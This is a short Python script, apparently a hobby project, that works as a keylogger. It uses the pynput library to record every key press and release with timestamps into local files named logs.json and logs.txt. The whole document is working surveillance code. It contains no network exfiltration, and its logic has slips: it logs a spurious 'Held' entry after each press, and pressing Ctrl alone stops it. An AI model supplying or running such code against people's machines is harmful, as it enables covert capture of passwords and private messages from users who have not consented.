from pynput import keyboard
import json
import datetime

key_list = []
x = False
key_strokes = ""


STOP_KEY_COMBINATION = {keyboard.Key.ctrl, keyboard.Key.alt, keyboard.KeyCode.from_char('s')}

def update_txt_file(key_strokes):
    with open('logs.txt', 'w+') as key_stroke:
        key_stroke.write(key_strokes)

def update_json_file(key_list):
    with open('logs.json', 'w') as key_log:
        json.dump(key_list, key_log)

def on_press(key):
    global x, key_list
    if x == False:
        key_list.append({'action': 'Pressed', 'key': f'{key}', 'timestamp': str(datetime.datetime.now())})
        x = True
    if x == True:
        key_list.append({'action': 'Held', 'key': f'{key}', 'timestamp': str(datetime.datetime.now())})
    update_json_file(key_list)
        
def on_release(key):
    global x, key_list, key_strokes

    if key in STOP_KEY_COMBINATION:
        print("[+] Keylogger stopped.")
        return False

    key_list.append({'action': 'Released', 'key': f'{key}', 'timestamp': str(datetime.datetime.now())})
    if x == True:
        x = False
    update_json_file(key_list)

    key_strokes = key_strokes + str(key)
    update_txt_file(key_strokes)

print("[+] Running keylogger successfully!\n[!] Saving the key logs in 'logs.json'")
print("[!] Press Ctrl + Alt + S to stop the keylogger.")

with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
